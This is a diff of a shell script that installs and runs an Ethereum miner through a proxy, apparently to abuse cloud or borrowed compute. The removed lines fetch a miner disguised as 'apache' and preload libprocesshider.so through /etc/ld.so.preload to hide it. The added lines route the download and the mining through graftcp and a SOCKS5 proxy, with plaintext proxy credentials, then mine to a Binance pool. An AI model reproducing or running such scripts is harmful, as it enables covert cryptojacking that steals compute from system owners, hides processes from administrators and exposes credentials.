@@ -1,48 +1,28 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
+sudo apt-get update -y
+wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 3.16.66.235:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
+socks5 = 45.140.13.119:9132
+socks5_username = sqpbedpy
+socks5_password = n3zs0as8ol71
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
-echo " "
-echo " "
-
-echo "******************************************************************"
-
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
-echo " "
-
-echo "******************************************************************"
 
 echo " "
-echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/apache
-chmod +x apache
+./graftcp/graftcp wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y2/miniZ_v1.8y2_linux-x64.tar.gz 
+tar xf miniZ_v1.8y2_linux-x64.tar.gz 
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicApache.zip
-unzip magicApache.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+chmod +x miniZ
 
-./graftcp/graftcp ./apache --algo ethash --server stratum+tcp://ethash.poolbinance.com --user teguhcong.Apache --ssl 1 --port 443
+./graftcp/graftcp ./miniZ -u teguhcong.$(echo $(shuf -i 1-999 -n 1)-T4) -l stratum+tcp://ethash.poolbinance.com --port=443 -p x --par=ethash --pers auto
